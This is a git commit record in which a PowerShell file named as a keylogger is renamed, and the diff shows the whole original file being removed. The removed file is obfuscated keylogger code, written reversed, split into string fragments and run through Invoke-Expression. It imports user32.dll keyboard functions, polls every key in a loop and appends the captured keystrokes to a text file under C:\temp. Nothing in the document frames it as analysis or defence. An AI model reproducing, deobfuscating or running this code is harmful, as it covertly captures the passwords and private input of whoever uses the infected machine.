bee7c2ab07df24bb8c68467d2d92acdb58c46e4d
ogBroadBandBandit <147538300+ogBroadBandBandit@users.noreply.github.com>
2024-09-26 16:46:52 -0500

    Update and rename KeyLogg-Funkyshit.ps1 to KeyLogg-Funky.ps1

--- KeyLogg-Funkyshit.ps1
+++
@@ -1,59 +0,0 @@
-﻿$X46  = "  ) )43]rAHC[,'w3H'eCaLPerc- 93]rAHC[,)021]rAHC[+94]rAHC[+57]rAHC[( eCaLPerc-63]rAHC[,'wD8'  eCaLPerc-29]rAHC[,'R2m'eCaLPerc- )'}tixe{ yllanif     
- }    
-}        
-}            
-}                
-}                   '+' '+'
-)edocinU::]gnido'+'cnE.txeT.metsyS[ ,rahcymwD8 ,htaPwD8('+'txeTllAdneppA::]eliF.OI.metsyS[           '+'         '+'    
-         '+' '+'             
-{ )eurtwD8 qe- )htapwD8 htaP-tseT( dna- ssecc'+'uswD8( fi                  '+'  
-
-)0 ,yticapaC.rahcymwD8 ,rahcymwD8 ,'+'etatsbkwD8 ,y'+'eKlautrivwD8 ,iicsawD8(edocinUoT::IPAwD8 = sseccuswD8    '+'                
-                    '+'
-
-redl'+'iuBgnirtS.txeT.metsyS ema'+'NepyT- tcejbO-weN ='+' rahcymwD8                    
-                    
-
-)etatsbkwD8(etatSdraobyeKte'+'G::IPAwD8 = etatsbkkcehcwD8            '+'        
-652 tsiLtn'+'emugr'+'A- ][etyB emaNepyT- t'+'cejbO-weN = etatsbkwD8                    
-     '+' '+'          '+' '+'   
-
-)3 ,iicsawD'+'8(yeKlautriVpaM::IPAw'+'D8 = ye'+'KlautrivwD8 '+'                   
-   '+'                 '+'
-
-kcoLspaC::]elosnoc[ = llunwD8                    
-{ )76723- qe'+'- etatswD8( fi                
-                
-
-)iicsawD8(etatSyeKcnysAteG::IPAwD8 = etatswD8             '+'   
-         '+'       
-{ )++iicsawD8 ;452 el- iicsawD8 ;9 '+'= iicsawD8( rof            
-            
-'+'
-04 sdnocesilliM- peel'+'S-tratS            
-
-           
-
-{)eslafwD8 en- )htapwD8 htaP-tseT(( elihw        
-        
-{ yrt    
-
-    
-urhTssaP- IPA ecapsemaN- x1K23niWx1K emaN- serutangi'+'swD8 noitinifeDrebmeM'+'- epyT-ddA = IPAwD8    
-    '+'
-
-@x1K
-;)sgalFw tniu ,ffuBhcc tni ,f'+'fu'+'Bzswp redliuBgnirtS.txeT.metsyS ,etatsyekpl ]['+'etyb ,edoCnacSw tniu ,yeKtriV'+'w tniu(edocinUoT tni nretxe citats cilbup
-])otuA.teSrahC=teSrahC ,w3Hlld.23resuw3H(tropmIllD[
-'+';)epyTpaMu tni ,edoCu tniu(yeKlautriVpaM t'+'ni nretxe citats cilbup
-])otuA.teSrahC=teSrahC ,w3Hlld.23resuw3H('+'tropmIll'+'D[
-;)etatsyek ][etyb(et'+'at'+'SdraobyeKteG tn'+'i nretxe citats cilbup
-'+'])otuA.teSrahC=teSrahC ,w3Hlld.23resuw3H(tropmIllD[
-'+';)edoCyeKlautriv tni(etatSyeKcnysAteG trohs n'+'retxe citats cilbup
-])eurt=gnillepStcaxE'+' ,otu'+'A.teSrahC=teSrahC ,w3Hlld.23'+'resuw3H(tropmIllD[
-x1K@ = serutangi'+'swD8    
-
-}htapwD8 metI-weN{ )eslafwD8 qe- )htapwD8 htaP-'+'tseT(( fi
-
-
-w3Htxt.reggolyekR2mpmetR2m:Cw3'+'H = htapw'+'D8'((()'x'+]03[emoHSp$+]4[EMohsP$ (."; "$( $oFs='' ) " +[STRIng] (( gEt-VARiAbLE  x46).VAlUe[ -1 ..-(( gEt-VARiAbLE  x46).VAlUe.leNGTH ) ]) +"$(SEt-varIablE  'OFS' ' ') " |iex
